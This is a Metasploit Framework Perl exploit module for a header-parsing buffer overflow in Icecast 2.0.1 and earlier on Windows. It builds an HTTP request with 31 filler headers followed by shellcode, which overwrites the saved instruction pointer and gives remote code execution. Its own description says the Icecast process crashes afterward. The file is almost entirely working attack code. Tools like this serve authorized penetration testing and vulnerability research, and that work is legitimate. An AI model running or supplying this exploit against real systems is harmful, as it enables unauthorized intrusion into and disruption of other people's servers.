
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::icecast_header;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  'LessTraffic' => [0, 'Use smaller (but less real looking) http headers'],
};

my $info = {
  'Name'    => 'Icecast (<= 2.0.1) Header Overwrite (win32)',
  'Version'  => '$Revision$',
  'Authors' => [
                 'spoonm <ninjatools [at] hush.com>',
                 'Luigi Auriemma <aluigi [at] autistici.org> (bug and exploit info)',
               ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'win32', 'win2000', 'winnt', 'winxp', 'win2003' ],
  'Priv'    => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 8000],
    },
  'Payload' =>
    {
      'Space'     => 2000,
      'BadChars'  => "\r\n\x00",
      'MinNops'   => 0,
      'MaxNops'   => 0, # nops are for slackers.
    },
  'Description'  => Pex::Text::Freeform(qq{
      This module exploits a buffer overflow in the header parsing of icecast,
      discovered by Luigi Auriemma.  Sending 32 HTTP headers will cause a write
      one past the end of a pointer array.  On win32 this happens to overwrite
      the saved instruction pointer, and on linux (depending on compiler, etc)
      this seems to generally overwrite nothing crucial (read not exploitable).

      !! This will crash the icecast process after the payload finishes exiting
      and this will usually throw up a error dialog box.  It would most likely
      do the same on unsuccessful exploitation (if that ever happens...)
    }),
  'Refs'  =>
    [
      [
        'URL',
        'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html',
      ],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

# Interesting that ebp is pushed after the local variables, and the line array
# is right before the saved eip, so overrunning it just by 1 element overwrites
# eip, making an interesting exploit....
# .text:00414C00                 sub     esp, 94h
# .text:00414C06                 push    ebx
# .text:00414C07                 push    ebp
# .text:00414C08                 push    esi


sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr' => $targetHost,
    'PeerPort' => $targetPort,
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  my $evul = "GET / HTTP/1.1\r\n";
  # look somewhat realistic, or something..
  if($self->GetLocal('LessTraffic')) {
    $evul .= " \r\n" x 31;
  }
  else {
    $evul .= "Accept: text/html\r\n" x 31;
  }
  $evul .= $shellcode . "\r\n";
  $evul .= "\r\n";

  $sock->Send($evul);

  return;
}

1;
